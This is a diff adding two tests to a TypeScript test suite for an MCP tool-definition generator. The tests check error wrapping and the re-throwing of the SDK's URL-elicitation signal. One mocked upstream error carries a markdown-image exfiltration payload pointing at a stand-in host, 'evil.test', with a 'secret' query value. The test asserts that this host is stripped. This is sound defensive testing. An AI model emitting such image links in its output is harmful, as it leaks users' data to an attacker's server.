@@ -6,6 +6,7 @@ import { writeFile, unlink, mkdir, rmdir } from "fs/promises";
 import { join } from "path";
 import { tmpdir } from "os";
 import { z } from "zod";
+import { UrlElicitationRequiredError } from "@modelcontextprotocol/sdk/types.js";
 import {
     validateApiSchema,
     ApiSchemaValidator,
@@ -1195,6 +1196,50 @@ describe("generateToolDefinitions", () => {
         expect(result.content[0].text).toContain('Unknown filter preset "nonexistent"');
         expect(result.content[0].text).toContain("summary, full");
         expect(mockedExecuteCurlRequest).not.toHaveBeenCalled();
+    });
+
+    // The general arm, reached from the executor: an error no specific arm
+    // recognises (the unknown-preset cases reach the same arm from inside the
+    // handler). It returns through the handler's own wrap rather than
+    // re-throwing, because `registerEndpointTools` registers this handler with
+    // no outer wrap, and a throw would leave the SDK to render the message
+    // unwrapped (invariant 1). The shipped executor never rejects, so the mock
+    // does.
+    it("returns an unrecognised error as a defended error result rather than rejecting", async () => {
+        const schema: ApiSchema = {
+            ...baseSchema,
+            endpoints: [
+                { id: "get_data", path: "/data", method: "GET", title: "Get Data", description: "Get data" },
+            ],
+        };
+        mockedExecuteCurlRequest.mockRejectedValueOnce(
+            new Error("upstream said: ![x](https://evil.test/?d=secret)")
+        );
+
+        const result = await generateToolDefinitions(schema)[0].handler({});
+
+        expect(result.isError).toBe(true);
+        expect(isWrappedResult(result)).toBe(true);
+        expect(result.content[0].text).toContain("upstream said:");
+        expect(result.content[0].text).not.toContain("evil.test");
+    });
+
+    // The one throw the catch passes on: the SDK's URL-elicitation signal,
+    // which the SDK's tool boundary carries to the client as a structured
+    // error and which a text conversion would strip.
+    it("re-throws the SDK's URL-elicitation signal instead of converting it", async () => {
+        const schema: ApiSchema = {
+            ...baseSchema,
+            endpoints: [
+                { id: "get_data", path: "/data", method: "GET", title: "Get Data", description: "Get data" },
+            ],
+        };
+        const signal = new UrlElicitationRequiredError([
+            { mode: "url", message: "Sign in to continue", elicitationId: "e-1", url: "https://auth.example.com/start" },
+        ]);
+        mockedExecuteCurlRequest.mockRejectedValueOnce(signal);
+
+        await expect(generateToolDefinitions(schema)[0].handler({})).rejects.toBe(signal);
     });
 
     it("handles body parameters for POST requests", async () => {
